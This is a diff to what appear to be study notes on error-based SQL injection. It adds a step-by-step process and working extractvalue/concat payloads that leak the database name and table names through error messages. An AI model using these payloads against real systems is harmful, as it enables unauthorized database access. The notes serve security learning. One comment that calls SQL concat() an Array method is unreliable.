@@ -13,7 +13,7 @@
 
 ------------------------------------------------------------------------------------------------------------------------------------
 
-# Part 1 - Error based SQL Injection
+# Part 1. Error based SQL Injection
 #   - Data output by using error messages
 # 1. Syntax Error in Logic Error
 #  ex) select * from member where id='
@@ -31,3 +31,21 @@
 #    concat('1','2') => 12      = The concat() method of Array instances is used to merge two or more arrays.
 #    concat(0x3a, 'test') => :test
 #    concat(0x3a, (select 'normaltic'))
+
+------------------------------------------------------------------------------------------------------------------------------------
+
+# Part 2. Error based SQL Injection Process
+#  1. Find SQL Point
+#    ex) normaltic'
+#  2. Output function of error
+#    extractvalue
+#  3. Create attack format
+#    normaltic' and extractvalue('1', concat(0x3a,(_______________))) and '1'='1
+#  4. Output of DB name
+#    select database()
+#    ex) normaltic' and extractvalue('1', concat(0x3a,(select database()))) and '1'='1
+#  5. Table name
+#    select table_name from information_schema.tables where table_schema = 'database_name' limit 0,1
+#    select table_name from information_schema.tables where table_schema = 'database_name' limit 1,1
+#    select table_name from information_schema.tables where table_schema = 'database_name' limit 2,1
+#    normaltic' and extractvalue('1', concat(0x3a,(select table_name from information_schema.tables where table_schema = 'database_name' limit 0,1))) and '1'='1
